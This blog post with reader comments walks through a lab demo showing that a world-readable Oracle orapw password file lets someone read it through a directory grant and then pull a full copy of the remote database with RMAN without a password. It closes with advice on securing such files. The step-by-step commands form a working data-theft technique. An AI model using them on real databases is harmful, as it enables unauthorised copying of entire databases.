@@ -1,0 +1,199 @@
+								<h1 class="entry-title">Keep your orapw password file secure</h1>
+		<div class="content-inner">
+			
+						
+						
+		   
+			<p>This is a small demo I did when I&#8217;ve found a database password file (orapw) lying around in /tmp with -rw-rw-rw- permissions, to show how this is a bad idea. People think that the orapw file only contains hashes to validate a password given, and forget that it can be used to connect to a remote database without password.
+<span id="more-20348"></span>
+I can easily imagine why the orapwd was there in /tmp. To build a standby database, you need to copy the password file to the standby server. If you don&#8217;t have direct access to the oracle user, but only a sudo access for &#8216;security reasons&#8217;, you can&#8217;t scp easily. Then you copy the file to /tmp, make it readable by all users, and you can scp with your user.</p>
+<p>In this demo I don&#8217;t even have access to the host. I&#8217;ve only access to connect to a PDB with the SCOTT users, reated with utlsampl.sql, with those additional privileges, a read access on $ORACLE_HOME/dbs:
+<pre></p>
+<p>SQL&gt; connect sys/oracle@//192.168.56.122/PDB1 as sysdba</p>
+<p>Connected.</p>
+<p>SQL&gt; create or replace directory DBS as '/u01/app/oracle/product/12.2.0/dbhome_1/dbs';</p>
+<p>Directory DBS created.</p>
+<p>SQL&gt; grant read on directory DBS to SCOTT;</p>
+<p>Grant succeeded.
+</pre>People tend to grant many privileges, and think that a read access on a directory which is supposed to contain only configuration files is harmless. Let&#8217;s see what you can do from another server.</p>
+<h3>Get the orapw file from a remote connection</h3>
+<p>I connect with SCOTT which can read from ORACLE_HOME/dbs:
+<pre></p>
+<p>SQL&gt; connect scott/tiger@//192.168.56.122/PDB1</p>
+<p>Connected.</p>
+<p>SQL&gt; show user</p>
+<p>USER is "SCOTT"</p>
+<p>SQL&gt; select * from all_directories;</p>
+<p>OWNER   DIRECTORY_NAME   DIRECTORY_PATH                                  ORIGIN_CON_ID</p>
+<p>-----   --------------   --------------                                  -------------</p>
+<p>SYS     DBS              /u01/app/oracle/product/12.2.0/dbhome_1/dbs                 4
+</pre>I create a table to read this file (other possibilities utl_tile, external tables,&#8230;):
+<pre></p>
+<p>SQL&gt; create table DEMO ( b blob );</p>
+<p>Table DEMO created.</p>
+<p>SQL&gt; insert into demo values ( bfilename('DBS','orapwCDB1') );</p>
+<p>1 row inserted.
+</pre>I&#8217;m on another server with the same version of Oracle Database software installed.</p>
+<p>I use sqlplus to retrieve the server file to my client:
+<pre></p>
+<p>sqlcl -s scott/tiger@//192.168.56.120/PDB1 &lt; $ORACLE_HOME/dbs/orapwCDB1</p>
+<p>set pages 0 lin 17000 long 1000000000 longc 16384</p>
+<p>select * from DEMO;</p>
+<p>exit</p>
+<p>EOF
+</pre>This (documented by <a href="https://laurentschneider.com/wordpress/2014/10/select-pdf-from-sqlplus.html" target="_blank">Laurent Schneider</a>) uses sqlplus to display the BLOB variable as hexadecimal code and xdd (installed with vim-common) to revert it to binary.</p>
+<p>So, on my server I have a copy of the database password file for the database I want to steal:
+<pre></p>
+[oracle@VM122 ~]$ strings /u01/app/oracle/product/12.2.0/dbhome_1/dbs/orapwCDB1</p>
+<p>ORACLE Remote Password file</p>
+<p>X)l)|</p>
+<p>SYSDG</p>
+<p>+933k\</p>
+<p>SYSBACKUP</p>
+<p>f       ts6 $9</p>
+<p>SYSKM
+</pre>Pull</p>
+<p>A nice feature of 12<i>c</i> is the ability to pull backups from a service. With this, it is the destination that connects to the source. I have diagrams to explain <a href="https://blog.dbi-services.com/rman-12c-push-and-pull-duplicate-explained/" target="_blank">here</a>). It is an easy alternative to RMAN DUPLICATE (see MOS <a href="https://support.oracle.com/epmos/faces/DocContentDisplay?id=2283978.1" target="_blank">Doc ID 2283978.1 Creating a Physical Standby database using RMAN restore from service</a>). And one difference is that you don&#8217;t have to provide the password:</p>
+<p>I prepare a small init.ora and directory for the datafiles
+<pre></p>
+<p>echo "db_name=CDB1" &gt; $ORACLE_HOME/dbs/initCDB1.ora</p>
+<p>mkdir -p /u01/oradata/CDB1
+</pre>I&#8217;m still on my server with the copy of the remote orapw file and a network access to the source database and I just restore it, without the need for a password:
+<pre></p>
+<p>RMAN&gt; connect target /</p>
+<p>connected to target database (not started)
+</pre>I start a local instance:
+<pre></p>
+<p>RMAN&gt; startup nomount force</p>
+<p>Oracle instance started</p>
+<p>Total System Global Area     859832320 bytes</p>
+<p>Fixed Size                     8798552 bytes</p>
+<p>Variable Size                784338600 bytes</p>
+<p>Database Buffers              58720256 bytes</p>
+<p>Redo Buffers                   7974912 bytes
+</pre>I restore the controlfile:
+<pre></p>
+<p>RMAN&gt; restore controlfile from service '//192.168.56.122/CDB1';</p>
+<p>Starting restore at 05-JAN-18</p>
+<p>using target database control file instead of recovery catalog</p>
+<p>allocated channel: ORA_DISK_1</p>
+<p>channel ORA_DISK_1: SID=262 device type=DISK</p>
+<p>channel ORA_DISK_1: starting datafile backup set restore</p>
+<p>channel ORA_DISK_1: using network backup set from service //192.168.56.122/CDB1</p>
+<p>channel ORA_DISK_1: restoring control file</p>
+<p>channel ORA_DISK_1: restore complete, elapsed time: 00:00:02</p>
+<p>output file name=/u01/oradata/CDB1/control01.ctl</p>
+<p>output file name=/u01/fast_recovery_area/CDB1/control02.ctl</p>
+<p>Finished restore at 05-JAN-18
+</pre>That&#8217;s the interesting part because it has to be connected, at least as SYSOPER, to the source database but I didn&#8217;t provide any password.</p>
+<p>I mount this controlfile locally:
+<pre></p>
+<p>RMAN&gt; alter database mount;</p>
+<p>Statement processed</p>
+<p>released channel: ORA_DISK_1
+</pre>And now it is easy to pull the whole database (the CDB with all its PDBs) to my local server:
+<pre></p>
+<p>RMAN&gt; restore database from service '//192.168.56.122/CDB1';</p>
+<p>Starting restore at 05-JAN-18</p>
+<p>Starting implicit crosscheck backup at 05-JAN-18</p>
+<p>allocated channel: ORA_DISK_1</p>
+<p>channel ORA_DISK_1: SID=262 device type=DISK</p>
+<p>Crosschecked 6 objects</p>
+<p>Finished implicit crosscheck backup at 05-JAN-18</p>
+<p>Starting implicit crosscheck copy at 05-JAN-18</p>
+<p>using channel ORA_DISK_1</p>
+<p>Finished implicit crosscheck copy at 05-JAN-18</p>
+<p>searching for all files in the recovery area</p>
+<p>cataloging files...</p>
+<p>cataloging done</p>
+<p>List of Cataloged Files</p>
+<p>=======================</p>
+<p>File Name: /u01/fast_recovery_area/CDB1/autobackup/2018_01_04/o1_mf_s_964524009_f4vzyt59_.bkp</p>
+<p>File Name: /u01/fast_recovery_area/CDB1/archivelog/2018_01_04/o1_mf_1_15_f4w5vv19_.arc</p>
+<p>File Name: /u01/fast_recovery_area/CDB1/archivelog/2018_01_04/o1_mf_1_16_f4wmm0t8_.arc</p>
+<p>File Name: /u01/fast_recovery_area/CDB1/archivelog/2018_01_04/o1_mf_1_14_f4vzjdl1_.arc</p>
+<p>using channel ORA_DISK_1</p>
+<p>channel ORA_DISK_1: starting datafile backup set restore</p>
+<p>channel ORA_DISK_1: using network backup set from service //192.168.56.122/CDB1</p>
+<p>channel ORA_DISK_1: specifying datafile(s) to restore from backup set</p>
+<p>channel ORA_DISK_1: restoring datafile 00001 to /u01/oradata/CDB1/system01.dbf</p>
+<p>channel ORA_DISK_1: restore complete, elapsed time: 00:00:16</p>
+<p>channel ORA_DISK_1: starting datafile backup set restore</p>
+<p>...
+</pre>So what?</p>
+<p>This is not an issue and is totally expected. In a Data Guard configuration, the primary and standby database have to communicate with each others and then need a passwordless authentication. This is done with the password file, and this is the reason why you need to copy it rather than just create another one with the same passwords.</p>
+<p>So, there is more than just a hash of the password (which is required to validate a password) and probably includes a key (randomly generated when you create the password file) used for passwordless authentication.</p>
+<p>Then, be careful, and do not give read access to the orapw files. You must secure them in the same way as a ssh key or an encryption wallet. and this include:</p>
+<ul>
+<li>Do not leave a copy of the orapw file in a shared location</li>
+<li>Be careful with grants on directories, even in READ</li>
+<li>Do not grant CREATE ANY DIRECTORY except for a PDB with PATH_PREFIX lockdown</li>
+</ul>
+<table class="rw-rating-table rw-ltr rw-left rw-no-labels"><tr><td><nobr>&nbsp;</nobr></td><td><div class="rw-left"><div class="rw-ui-container rw-class-blog-post rw-urid-203490"></div></div></td></tr></table>							
+		</div><!--/content-inner-->
+<div class="comment-wrap ">
+
+	<h3 id="comments"> 2 Comments</h3>
+
+	<div class="navigation">
+		<div class="alignleft"></div>
+		<div class="alignright"></div>
+	</div>
+
+	<ul class="comment-list ">
+				<li class="comment even thread-even depth-1 parent" id="comment-10044">
+				<div id="div-comment-10044" class="comment-body">
+				<div class="comment-author vcard">
+			<img alt='' src='https://secure.gravatar.com/avatar/fb64b1ce533a14c3180d912cb2f52989?s=60&amp;d=https%3A%2F%2Fsecure.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D60&amp;r=G' class='avatar avatar-60 photo' height='60' width='60' />			<cite class="fn"><a href='http://www.dbarj.com.br' rel='external nofollow' class='url'>Rodrigo Jorge</a></cite> <span class="says">says:</span>		</div>
+		
+		<div class="comment-meta commentmetadata"><a href="index.html#comment-10044">
+			January 8, 2018 at 17 h 32 min</a>		</div>
+
+		<p>Great article Franck. This is something that have always concerned me: the ability of a passwordless connection just having a copy of a pwfile. As you said, if pwfile was just a collection of hashes, the SBY DB wouldn&#8217;t be able to authenticate with the PRI DB as it won&#8217;t be able to reverse the hash. So something else is there to allow this connection.</p>
+<p>Oracle should change this behavior. In my opinion, a DG should work together with Oracle Wallet (you would setup there the credentials of PRI instance) and pwfile should be only a collection of hashes.</p>
+<p>Cheers,
+Rodrigo Jorge
+<table class="rw-rating-table rw-ltr rw-left rw-no-labels">
+<tr>
+<td><nobr>&nbsp;</nobr></td>
+<td>
+<div class="rw-left">
+<div class="rw-ui-container rw-class-comment rw-urid-100451"></div>
+</div>
+</td>
+</tr>
+</table>
+
+		<div class="reply"><a class='comment-reply-link' href='index.html#comment-10044' onclick='return addComment.moveForm( "div-comment-10044", "10044", "respond", "20348" )' aria-label='Reply to Rodrigo to Rodrigo Jorge'>Reply to Rodrigo</a></div>
+				</div>
+		<ul class="children">
+		<li class="comment byuser comment-author-franck-pachot bypostauthor odd alt depth-2" id="comment-10045">
+				<div id="div-comment-10045" class="comment-body">
+				<div class="comment-author vcard">
+			<img alt='' src='https://secure.gravatar.com/avatar/9c04a89267afa42e63eeb3d620f4b873?s=60&amp;d=https%3A%2F%2Fsecure.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D60&amp;r=G' class='avatar avatar-60 photo' height='60' width='60' />			<cite class="fn"><a href='https://www.linkedin.com/in/franckpachot' rel='external nofollow' class='url'>Franck Pachot</a></cite> <span class="says">says:</span>		</div>
+		
+		<div class="comment-meta commentmetadata"><a href="index.html#comment-10045">
+			January 8, 2018 at 18 h 00 min</a>		</div>
+
+		<p>Hi Rodrigo, Thanks for your feedback. Cheers, Franck.
+<table class="rw-rating-table rw-ltr rw-left rw-no-labels">
+<tr>
+<td><nobr>&nbsp;</nobr></td>
+<td>
+<div class="rw-left">
+<div class="rw-ui-container rw-class-comment rw-urid-100461"></div>
+</div>
+</td>
+</tr>
+</table>
+
+		<div class="reply"><a class='comment-reply-link' href='index.html#comment-10045' onclick='return addComment.moveForm( "div-comment-10045", "10045", "respond", "20348" )' aria-label='Reply to Franck to Franck Pachot'>Reply to Franck</a></div>
+				</div>
+		</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+	</ul>
+
+ 
+
+								<div id="respond" class="comment-respond">
